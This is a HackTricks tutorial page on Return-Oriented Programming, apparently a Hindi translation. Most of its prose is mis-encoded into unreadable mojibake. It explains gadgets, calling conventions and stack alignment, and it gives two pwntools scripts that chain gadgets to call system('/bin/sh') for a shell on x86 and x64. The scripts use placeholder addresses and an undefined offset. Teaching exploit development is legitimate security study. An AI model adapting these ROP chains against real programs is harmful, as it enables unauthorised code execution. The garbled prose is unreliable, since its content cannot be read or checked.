# ROP - Return Oriented Programing

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ЁЯТм [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ЁЯРж [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## **Basic Information**

**Return-Oriented Programming (ROP)** рдПрдХ рдЙрдиреНрдирдд рд╢реЛрд╖рдг рддрдХрдиреАрдХ рд╣реИ рдЬрд┐рд╕рдХрд╛ рдЙрдкрдпреЛрдЧ рд╕реБрд░рдХреНрд╖рд╛ рдЙрдкрд╛рдпреЛрдВ рдЬреИрд╕реЗ **No-Execute (NX)** рдпрд╛ **Data Execution Prevention (DEP)** рдХреЛ рджрд░рдХрд┐рдирд╛рд░ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред рд╢реЗрд▓рдХреЛрдб рдХреЛ рдЗрдВрдЬреЗрдХреНрдЯ рдФрд░ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдХреЗ рдмрдЬрд╛рдп, рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рдмрд╛рдЗрдирд░реА рдпрд╛ рд▓реЛрдб рдХреА рдЧрдИ рд▓рд╛рдЗрдмреНрд░реЗрд░реА рдореЗрдВ рдкрд╣рд▓реЗ рд╕реЗ рдореМрдЬреВрдж рдХреЛрдб рдХреЗ рдЯреБрдХрдбрд╝реЛрдВ рдХрд╛ рд▓рд╛рдн рдЙрдард╛рддрд╛ рд╣реИ, рдЬрд┐рд╕реЗ **"gadgets"** рдХреЗ рд░реВрдк рдореЗрдВ рдЬрд╛рдирд╛ рдЬрд╛рддрд╛ рд╣реИред рдкреНрд░рддреНрдпреЗрдХ gadget рдЖрдорддреМрд░ рдкрд░ рдПрдХ `ret` рдирд┐рд░реНрджреЗрд╢ рдХреЗ рд╕рд╛рде рд╕рдорд╛рдкреНрдд рд╣реЛрддрд╛ рд╣реИ рдФрд░ рдбреЗрдЯрд╛ рдХреЛ рд░рдЬрд┐рд╕реНрдЯрд░ рдХреЗ рдмреАрдЪ рд╕реНрдерд╛рдирд╛рдВрддрд░рд┐рдд рдХрд░рдиреЗ рдпрд╛ рдЕрдВрдХрдЧрдгрд┐рддреАрдп рд╕рдВрдЪрд╛рд▓рди рдХрд░рдиреЗ рдЬреИрд╕реЗ рдЫреЛрдЯреЗ рдХрд╛рд░реНрдп рдХрд░рддрд╛ рд╣реИред рдЗрди gadgets рдХреЛ рдПрдХ рд╕рд╛рде рдЬреЛрдбрд╝рдХрд░, рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рдордирдЪрд╛рд╣реЗ рд╕рдВрдЪрд╛рд▓рди рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ payload рдмрдирд╛ рд╕рдХрддрд╛ рд╣реИ, рдкреНрд░рднрд╛рд╡реА рд░реВрдк рд╕реЗ NX/DEP рд╕реБрд░рдХреНрд╖рд╛ рдХреЛ рджрд░рдХрд┐рдирд╛рд░ рдХрд░ рд╕рдХрддрд╛ рд╣реИред

### How ROP Works

1. **Control Flow Hijacking**: рд╕рдмрд╕реЗ рдкрд╣рд▓реЗ, рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рдХреЛ рдПрдХ рдкреНрд░реЛрдЧреНрд░рд╛рдо рдХреЗ рдирд┐рдпрдВрддреНрд░рдг рдкреНрд░рд╡рд╛рд╣ рдХреЛ рд╣рд╛рдИрдЬреИрдХ рдХрд░рдирд╛ рд╣реЛрддрд╛ рд╣реИ, рдЖрдорддреМрд░ рдкрд░ рдПрдХ рдмрдлрд░ рдУрд╡рд░рдлреНрд▓реЛ рдХрд╛ рд╢реЛрд╖рдг рдХрд░рдХреЗ рд╕реНрдЯреИрдХ рдкрд░ рдПрдХ рд╕рд╣реЗрдЬреЗ рдЧрдП рд▓реМрдЯрдиреЗ рдХреЗ рдкрддреЗ рдХреЛ рдУрд╡рд░рд░рд╛рдЗрдЯ рдХрд░рдХреЗред
2. **Gadget Chaining**: рдлрд┐рд░ рд╣рдорд▓рд╛рд╡рд░ рд╕рд╛рд╡рдзрд╛рдиреАрдкреВрд░реНрд╡рдХ рдЗрдЪреНрдЫрд┐рдд рдХреНрд░рд┐рдпрд╛рдУрдВ рдХреЛ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП gadgets рдХрд╛ рдЪрдпрди рдФрд░ рд╢реНрд░реГрдВрдЦрд▓рд╛ рдмрдирд╛рддрд╛ рд╣реИред рдЗрд╕рдореЗрдВ рдПрдХ рдлрд╝рдВрдХреНрд╢рди рдХреЙрд▓ рдХреЗ рд▓рд┐рдП рддрд░реНрдХ рд╕реЗрдЯ рдХрд░рдирд╛, рдлрд╝рдВрдХреНрд╢рди рдХреЛ рдХреЙрд▓ рдХрд░рдирд╛ (рдЬреИрд╕реЗ, `system("/bin/sh")`), рдФрд░ рдХрд┐рд╕реА рднреА рдЖрд╡рд╢реНрдпрдХ рд╕рдлрд╛рдИ рдпрд╛ рдЕрддрд┐рд░рд┐рдХреНрдд рд╕рдВрдЪрд╛рд▓рди рдХреЛ рд╕рдВрднрд╛рд▓рдирд╛ рд╢рд╛рдорд┐рд▓ рд╣реЛ рд╕рдХрддрд╛ рд╣реИред
3. **Payload Execution**: рдЬрдм рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рдлрд╝рдВрдХреНрд╢рди рд▓реМрдЯрддрд╛ рд╣реИ, рддреЛ рдпрд╣ рдПрдХ рд╡реИрдз рд╕реНрдерд╛рди рдкрд░ рд▓реМрдЯрдиреЗ рдХреЗ рдмрдЬрд╛рдп gadgets рдХреА рд╢реНрд░реГрдВрдЦрд▓рд╛ рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдирд╛ рд╢реБрд░реВ рдХрд░ рджреЗрддрд╛ рд╣реИред

### Tools

рдЖрдорддреМрд░ рдкрд░, gadgets рдХреЛ **[ROPgadget](https://github.com/JonathanSalwan/ROPgadget)**, **[ropper](https://github.com/sashs/Ropper)** рдпрд╛ рд╕реАрдзреЗ **pwntools** ([ROP](https://docs.pwntools.com/en/stable/rop/rop.html)) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдкрд╛рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред

## ROP Chain in x86 Example

### **x86 (32-bit) Calling conventions**

* **cdecl**: рдХреЙрд▓рд░ рд╕реНрдЯреИрдХ рдХреЛ рд╕рд╛рдл рдХрд░рддрд╛ рд╣реИред рдлрд╝рдВрдХреНрд╢рди рддрд░реНрдХреЛрдВ рдХреЛ рдЙрд▓реНрдЯреЗ рдХреНрд░рдо рдореЗрдВ (рджрд╛рдПрдВ рд╕реЗ рдмрд╛рдПрдВ) рд╕реНрдЯреИрдХ рдкрд░ рдзрдХреЗрд▓рд╛ рдЬрд╛рддрд╛ рд╣реИред **Arguments are pushed onto the stack from right to left.**
* **stdcall**: cdecl рдХреЗ рд╕рдорд╛рди, рд▓реЗрдХрд┐рди callee рд╕реНрдЯреИрдХ рдХреЛ рд╕рд╛рдл рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЬрд┐рдореНрдореЗрджрд╛рд░ рд╣реЛрддрд╛ рд╣реИред

### **Finding Gadgets**

рдкрд╣рд▓реЗ, рдЪрд▓рд┐рдП рдорд╛рди рд▓реЗрддреЗ рд╣реИрдВ рдХрд┐ рд╣рдордиреЗ рдмрд╛рдЗрдирд░реА рдпрд╛ рдЗрд╕рдХреЗ рд▓реЛрдб рдХреА рдЧрдИ рд▓рд╛рдЗрдмреНрд░реЗрд░реА рдореЗрдВ рдЖрд╡рд╢реНрдпрдХ gadgets рдХреА рдкрд╣рдЪрд╛рди рдХреА рд╣реИред рдЬрд┐рди gadgets рдореЗрдВ рд╣рдорд╛рд░реА рд░реБрдЪрд┐ рд╣реИ, рд╡реЗ рд╣реИрдВ:

* `pop eax; ret`: рдпрд╣ gadget рд╕реНрдЯреИрдХ рдХреЗ рд╢реАрд░реНрд╖ рдорд╛рди рдХреЛ `EAX` рд░рдЬрд┐рд╕реНрдЯрд░ рдореЗрдВ рдкреЙрдк рдХрд░рддрд╛ рд╣реИ рдФрд░ рдлрд┐рд░ рд▓реМрдЯрддрд╛ рд╣реИ, рдЬрд┐рд╕рд╕реЗ рд╣рдореЗрдВ `EAX` рдХреЛ рдирд┐рдпрдВрддреНрд░рд┐рдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рдорд┐рд▓рддреА рд╣реИред
* `pop ebx; ret`: рдКрдкрд░ рдХреЗ рд╕рдорд╛рди, рд▓реЗрдХрд┐рди `EBX` рд░рдЬрд┐рд╕реНрдЯрд░ рдХреЗ рд▓рд┐рдП, рдЬрд┐рд╕рд╕реЗ `EBX` рдкрд░ рдирд┐рдпрдВрддреНрд░рдг рдкреНрд░рд╛рдкреНрдд рд╣реЛрддрд╛ рд╣реИред
* `mov [ebx], eax; ret`: `EAX` рдореЗрдВ рдорд╛рди рдХреЛ `EBX` рджреНрд╡рд╛рд░рд╛ рдЗрдВрдЧрд┐рдд рдореЗрдореЛрд░реА рд╕реНрдерд╛рди рдкрд░ рд╕реНрдерд╛рдирд╛рдВрддрд░рд┐рдд рдХрд░рддрд╛ рд╣реИ рдФрд░ рдлрд┐рд░ рд▓реМрдЯрддрд╛ рд╣реИред рдЗрд╕реЗ рдЕрдХреНрд╕рд░ **write-what-where gadget** рдХрд╣рд╛ рдЬрд╛рддрд╛ рд╣реИред
* рдЗрд╕рдХреЗ рдЕрд▓рд╛рд╡рд╛, рд╣рдорд╛рд░реЗ рдкрд╛рд╕ `system()` рдлрд╝рдВрдХреНрд╢рди рдХрд╛ рдкрддрд╛ рдЙрдкрд▓рдмреНрдз рд╣реИред

### **ROP Chain**

**pwntools** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддреЗ рд╣реБрдП, рд╣рдо ROP рд╢реНрд░реГрдВрдЦрд▓рд╛ рдирд┐рд╖реНрдкрд╛рджрди рдХреЗ рд▓рд┐рдП рд╕реНрдЯреИрдХ рдХреЛ рдЗрд╕ рдкреНрд░рдХрд╛рд░ рддреИрдпрд╛рд░ рдХрд░рддреЗ рд╣реИрдВ рдЬрд┐рд╕рдХрд╛ рд▓рдХреНрд╖реНрдп `system('/bin/sh')` рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдирд╛ рд╣реИ, рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рд╢реНрд░реГрдВрдЦрд▓рд╛ рдЗрд╕ рдкреНрд░рдХрд╛рд░ рд╢реБрд░реВ рд╣реЛрддреА рд╣реИ:

1. рд╕рдВрд░реЗрдЦрдг рдЙрджреНрджреЗрд╢реНрдпреЛрдВ рдХреЗ рд▓рд┐рдП рдПрдХ `ret` рдирд┐рд░реНрджреЗрд╢ (рд╡реИрдХрд▓реНрдкрд┐рдХ)
2. `system` рдлрд╝рдВрдХреНрд╢рди рдХрд╛ рдкрддрд╛ (рдорд╛рди рд▓реЗрддреЗ рд╣реИрдВ рдХрд┐ ASLR рдЕрдХреНрд╖рдо рд╣реИ рдФрд░ libc рдЬреНрдЮрд╛рдд рд╣реИ, рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА [**Ret2lib**](ret2lib/) рдореЗрдВ)
3. `system()` рд╕реЗ рд▓реМрдЯрдиреЗ рдХреЗ рдкрддреЗ рдХреЗ рд▓рд┐рдП рдкреНрд▓реЗрд╕рд╣реЛрд▓реНрдбрд░
4. `"/bin/sh"` рд╕реНрдЯреНрд░рд┐рдВрдЧ рдХрд╛ рдкрддрд╛ (system рдлрд╝рдВрдХреНрд╢рди рдХреЗ рд▓рд┐рдП рдкреИрд░рд╛рдореАрдЯрд░)
```python
from pwn import *

# Assuming we have the binary's ELF and its process
binary = context.binary = ELF('your_binary_here')
p = process(binary.path)

# Find the address of the string "/bin/sh" in the binary
bin_sh_addr = next(binary.search(b'/bin/sh\x00'))

# Address of system() function (hypothetical value)
system_addr = 0xdeadc0de

# A gadget to control the return address, typically found through analysis
ret_gadget = 0xcafebabe  # This could be any gadget that allows us to control the return address

# Construct the ROP chain
rop_chain = [
ret_gadget,    # This gadget is used to align the stack if necessary, especially to bypass stack alignment issues
system_addr,   # Address of system(). Execution will continue here after the ret gadget
0x41414141,    # Placeholder for system()'s return address. This could be the address of exit() or another safe place.
bin_sh_addr    # Address of "/bin/sh" string goes here, as the argument to system()
]

# Flatten the rop_chain for use
rop_chain = b''.join(p32(addr) for addr in rop_chain)

# Send ROP chain
## offset is the number of bytes required to reach the return address on the stack
payload = fit({offset: rop_chain})
p.sendline(payload)
p.interactive()
```
## ROP Chain in x64 Example

### **x64 (64-bit) Calling conventions**

* Uses the **System V AMD64 ABI** calling convention on Unix-like systems, where the **first six integer or pointer arguments are passed in the registers `RDI`, `RSI`, `RDX`, `RCX`, `R8`, and `R9`**. Additional arguments are passed on the stack. The return value is placed in `RAX`.
* **Windows x64** calling convention uses `RCX`, `RDX`, `R8`, and `R9` for the first four integer or pointer arguments, with additional arguments passed on the stack. The return value is placed in `RAX`.
* **Registers**: 64-bit registers include `RAX`, `RBX`, `RCX`, `RDX`, `RSI`, `RDI`, `RBP`, `RSP`, and `R8` to `R15`.

#### **Finding Gadgets**

рд╣рдорд╛рд░реЗ рдЙрджреНрджреЗрд╢реНрдп рдХреЗ рд▓рд┐рдП, рдЪрд▓рд┐рдП рдЙрди рдЧреИрдЬреЗрдЯреНрд╕ рдкрд░ рдзреНрдпрд╛рди рдХреЗрдВрджреНрд░рд┐рдд рдХрд░рддреЗ рд╣реИрдВ рдЬреЛ рд╣рдореЗрдВ **RDI** рд░рдЬрд┐рд╕реНрдЯрд░ рд╕реЗрдЯ рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрдВрдЧреЗ (рддрд╛рдХрд┐ **system()** рдХреЛ **"/bin/sh"** рд╕реНрдЯреНрд░рд┐рдВрдЧ рдХреЗ рд░реВрдк рдореЗрдВ рдПрдХ рддрд░реНрдХ рдкрд╛рд╕ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХреЗ) рдФрд░ рдлрд┐рд░ **system()** рдлрд╝рдВрдХреНрд╢рди рдХреЛ рдХреЙрд▓ рдХрд░реЗрдВред рд╣рдо рдорд╛рди рд▓реЗрддреЗ рд╣реИрдВ рдХрд┐ рд╣рдордиреЗ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдЧреИрдЬреЗрдЯреНрд╕ рдХреА рдкрд╣рдЪрд╛рди рдХреА рд╣реИ:

* **pop rdi; ret**: рд╕реНрдЯреИрдХ рдХреЗ рд╢реАрд░реНрд╖ рдорд╛рди рдХреЛ **RDI** рдореЗрдВ рдкреЙрдк рдХрд░рддрд╛ рд╣реИ рдФрд░ рдлрд┐рд░ рд▓реМрдЯрддрд╛ рд╣реИред **system()** рдХреЗ рд▓рд┐рдП рд╣рдорд╛рд░реЗ рддрд░реНрдХ рдХреЛ рд╕реЗрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЖрд╡рд╢реНрдпрдХред
* **ret**: рдПрдХ рд╕рд╛рдзрд╛рд░рдг рд░рд┐рдЯрд░реНрди, рдХреБрдЫ рдкрд░рд┐рджреГрд╢реНрдпреЛрдВ рдореЗрдВ рд╕реНрдЯреИрдХ рд╕рдВрд░реЗрдЦрдг рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧреАред

рдФрд░ рд╣рдо рдЬрд╛рдирддреЗ рд╣реИрдВ рдХрд┐ **system()** рдлрд╝рдВрдХреНрд╢рди рдХрд╛ рдкрддрд╛ рдХреНрдпрд╛ рд╣реИред

### **ROP Chain**

рдиреАрдЪреЗ рдПрдХ рдЙрджрд╛рд╣рд░рдг рд╣реИ рдЬреЛ **pwntools** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ **system('/bin/sh')** рдХреЛ **x64** рдкрд░ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП ROP рдЪреЗрди рд╕реЗрдЯрдЕрдк рдФрд░ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рддрд╛ рд╣реИ:
```python
from pwn import *

# Assuming we have the binary's ELF and its process
binary = context.binary = ELF('your_binary_here')
p = process(binary.path)

# Find the address of the string "/bin/sh" in the binary
bin_sh_addr = next(binary.search(b'/bin/sh\x00'))

# Address of system() function (hypothetical value)
system_addr = 0xdeadbeefdeadbeef

# Gadgets (hypothetical values)
pop_rdi_gadget = 0xcafebabecafebabe  # pop rdi; ret
ret_gadget = 0xdeadbeefdeadbead     # ret gadget for alignment, if necessary

# Construct the ROP chain
rop_chain = [
ret_gadget,        # Alignment gadget, if needed
pop_rdi_gadget,    # pop rdi; ret
bin_sh_addr,       # Address of "/bin/sh" string goes here, as the argument to system()
system_addr        # Address of system(). Execution will continue here.
]

# Flatten the rop_chain for use
rop_chain = b''.join(p64(addr) for addr in rop_chain)

# Send ROP chain
## offset is the number of bytes required to reach the return address on the stack
payload = fit({offset: rop_chain})
p.sendline(payload)
p.interactive()
```
In this example:

* рд╣рдо **`pop rdi; ret`** рдЧреИрдЬреЗрдЯ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддреЗ рд╣реИрдВ рддрд╛рдХрд┐ **`RDI`** рдХреЛ **`"/bin/sh"`** рдХреЗ рдкрддреЗ рдкрд░ рд╕реЗрдЯ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХреЗред
* рд╣рдо **`RDI`** рд╕реЗрдЯ рдХрд░рдиреЗ рдХреЗ рдмрд╛рдж рд╕реАрдзреЗ **`system()`** рдкрд░ рдХреВрджрддреЗ рд╣реИрдВ, рдЬрд┐рд╕рдореЗрдВ **system()** рдХрд╛ рдкрддрд╛ рд╢реНрд░реГрдВрдЦрд▓рд╛ рдореЗрдВ рд╣реЛрддрд╛ рд╣реИред
* рдпрджрд┐ рд▓рдХреНрд╖рд┐рдд рд╡рд╛рддрд╛рд╡рд░рдг рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛ, рддреЛ **`ret_gadget`** рд╕рдВрд░реЗрдЦрдг рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рдЬреЛ **x64** рдореЗрдВ рдХрд╛рд░реНрдпреЛрдВ рдХреЛ рдХреЙрд▓ рдХрд░рдиреЗ рд╕реЗ рдкрд╣рд▓реЗ рдЙрдЪрд┐рдд рд╕реНрдЯреИрдХ рд╕рдВрд░реЗрдЦрдг рд╕реБрдирд┐рд╢реНрдЪрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЕрдзрд┐рдХ рд╕рд╛рдорд╛рдиреНрдп рд╣реИред

### Stack Alignment

**x86-64 ABI** рд╕реБрдирд┐рд╢реНрдЪрд┐рдд рдХрд░рддрд╛ рд╣реИ рдХрд┐ рдЬрдм **call instruction** рдирд┐рд╖реНрдкрд╛рджрд┐рдд рд╣реЛрддреА рд╣реИ, рддреЛ **stack 16-byte aligned** рд╣реЛред **LIBC**, рдкреНрд░рджрд░реНрд╢рди рдХреЛ рдЕрдиреБрдХреВрд▓рд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, **SSE instructions** (рдЬреИрд╕реЗ **movaps**) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИ рдЬреЛ рдЗрд╕ рд╕рдВрд░реЗрдЦрдг рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрддреА рд╣реИред рдпрджрд┐ рд╕реНрдЯреИрдХ рдареАрдХ рд╕реЗ рд╕рдВрд░реЗрдЦрд┐рдд рдирд╣реАрдВ рд╣реИ (рдЬрд┐рд╕рдХрд╛ рдЕрд░реНрде рд╣реИ рдХрд┐ **RSP** 16 рдХрд╛ рдЧреБрдгрд╛рдВрдХ рдирд╣реАрдВ рд╣реИ), рддреЛ **ROP chain** рдореЗрдВ **system** рдЬреИрд╕реА рдХрд╛рд░реНрдпреЛрдВ рдХреЗ рд▓рд┐рдП рдХреЙрд▓ рд╡рд┐рдлрд▓ рд╣реЛ рдЬрд╛рдПрдВрдЧреЗред рдЗрд╕реЗ рдареАрдХ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, рдЕрдкрдиреЗ ROP рд╢реНрд░реГрдВрдЦрд▓рд╛ рдореЗрдВ **system** рдХреЛ рдХреЙрд▓ рдХрд░рдиреЗ рд╕реЗ рдкрд╣рд▓реЗ рдмрд╕ рдПрдХ **ret gadget** рдЬреЛрдбрд╝реЗрдВред

## x86 vs x64 рдореБрдЦреНрдп рдЕрдВрддрд░

{% hint style="success" %}
рдЪреВрдВрдХрд┐ x64 рдкрд╣рд▓реЗ рдХреБрдЫ рддрд░реНрдХреЛрдВ рдХреЗ рд▓рд┐рдП рд░рдЬрд┐рд╕реНрдЯрд░ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИ, рдЗрд╕рд▓рд┐рдП рдпрд╣ рдЕрдХреНрд╕рд░ рд╕рд░рд▓ рдХрд╛рд░реНрдп рдХреЙрд▓ рдХреЗ рд▓рд┐рдП x86 рдХреА рддреБрд▓рдирд╛ рдореЗрдВ рдХрдо рдЧреИрдЬреЗрдЯ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрддреА рд╣реИ, рд▓реЗрдХрд┐рди рд╕рд╣реА рдЧреИрдЬреЗрдЯ рдХреЛ рдЦреЛрдЬрдиреЗ рдФрд░ рд╢реНрд░реГрдВрдЦрд▓рд╛ рдореЗрдВ рдЬреЛрдбрд╝рдирд╛ рдЕрдзрд┐рдХ рдЬрдЯрд┐рд▓ рд╣реЛ рд╕рдХрддрд╛ рд╣реИ рдХреНрдпреЛрдВрдХрд┐ рд░рдЬрд┐рд╕реНрдЯрд░ рдХреА рд╕рдВрдЦреНрдпрд╛ рдФрд░ рдкрддрд╛ рд╕реНрдерд╛рди рдмрдврд╝ рдЬрд╛рддрд╛ рд╣реИред **x64** рдЖрд░реНрдХрд┐рдЯреЗрдХреНрдЪрд░ рдореЗрдВ рд░рдЬрд┐рд╕реНрдЯрд░ рдХреА рдмрдврд╝реА рд╣реБрдИ рд╕рдВрдЦреНрдпрд╛ рдФрд░ рдмрдбрд╝реЗ рдкрддреЗ рдХреЗ рд╕реНрдерд╛рди рдиреЗ рд╡рд┐рд╢реЗрд╖ рд░реВрдк рд╕реЗ Return-Oriented Programming (ROP) рдХреЗ рд╕рдВрджрд░реНрдн рдореЗрдВ рд╢реЛрд╖рдг рд╡рд┐рдХрд╛рд╕ рдХреЗ рд▓рд┐рдП рдЕрд╡рд╕рд░ рдФрд░ рдЪреБрдиреМрддрд┐рдпрд╛рдБ рджреЛрдиреЛрдВ рдкреНрд░рджрд╛рди рдХреА рд╣реИрдВред
{% endhint %}

## Protections

* [**ASLR**](../common-binary-protections-and-bypasses/aslr/)
* [**Stack Canaries**](../common-binary-protections-and-bypasses/stack-canaries/)

## Other Examples & References

* [https://ir0nstone.gitbook.io/notes/types/stack/return-oriented-programming/exploiting-calling-conventions](https://ir0nstone.gitbook.io/notes/types/stack/return-oriented-programming/exploiting-calling-conventions)

## ROP рдЖрдзрд╛рд░рд┐рдд рддрдХрдиреАрдХреЗрдВ

рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ ROP рдХреЗрд╡рд▓ рдордирдорд╛рдиреЗ рдХреЛрдб рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдХреА рдПрдХ рддрдХрдиреАрдХ рд╣реИред ROP рдХреЗ рдЖрдзрд╛рд░ рдкрд░ рдХрдИ Ret2XXX рддрдХрдиреАрдХреЗрдВ рд╡рд┐рдХрд╕рд┐рдд рдХреА рдЧрдИрдВ:

* **Ret2lib**: рдордирдорд╛рдиреЗ рдкреИрд░рд╛рдореАрдЯрд░ рдХреЗ рд╕рд╛рде рдПрдХ рд▓реЛрдбреЗрдб рд▓рд╛рдЗрдмреНрд░реЗрд░реА рд╕реЗ рдордирдорд╛рдиреЗ рдХрд╛рд░реНрдпреЛрдВ рдХреЛ рдХреЙрд▓ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП ROP рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ (рдЖрдорддреМрд░ рдкрд░ рдХреБрдЫ рдРрд╕рд╛ рдЬреИрд╕реЗ `system('/bin/sh')`ред

{% content-ref url="ret2lib/" %}
[ret2lib](ret2lib/)
{% endcontent-ref %}

* **Ret2Syscall**: ROP рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдПрдХ syscall, рдЬреИрд╕реЗ `execve`, рдХреЗ рд▓рд┐рдП рдХреЙрд▓ рддреИрдпрд╛рд░ рдХрд░реЗрдВ, рдФрд░ рдЗрд╕реЗ рдордирдорд╛рдиреЗ рдЖрджреЗрд╢ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдмрдирд╛рдПрдВред

{% content-ref url="rop-syscall-execv.md" %}
[rop-syscall-execv.md](rop-syscall-execv.md)
{% endcontent-ref %}

* **EBP2Ret & EBP Chaining**: рдкрд╣рд▓рд╛ EIP рдХреЗ рдмрдЬрд╛рдп EBP рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░реЗрдЧрд╛ рддрд╛рдХрд┐ рдкреНрд░рд╡рд╛рд╣ рдХреЛ рдирд┐рдпрдВрддреНрд░рд┐рдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХреЗ рдФрд░ рджреВрд╕рд░рд╛ Ret2lib рдХреЗ рд╕рдорд╛рди рд╣реИ рд▓реЗрдХрд┐рди рдЗрд╕ рдорд╛рдорд▓реЗ рдореЗрдВ рдкреНрд░рд╡рд╛рд╣ рдореБрдЦреНрдп рд░реВрдк рд╕реЗ EBP рдкрддреЗ рдХреЗ рд╕рд╛рде рдирд┐рдпрдВрддреНрд░рд┐рдд рд╣реЛрддрд╛ рд╣реИ (рд╣рд╛рд▓рд╛рдВрдХрд┐ EIP рдХреЛ рдирд┐рдпрдВрддреНрд░рд┐рдд рдХрд░рдирд╛ рднреА рдЖрд╡рд╢реНрдпрдХ рд╣реИ)ред

{% content-ref url="stack-pivoting-ebp2ret-ebp-chaining.md" %}
[stack-pivoting-ebp2ret-ebp-chaining.md](stack-pivoting-ebp2ret-ebp-chaining.md)
{% endcontent-ref %}

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ЁЯТм [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ЁЯРж [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
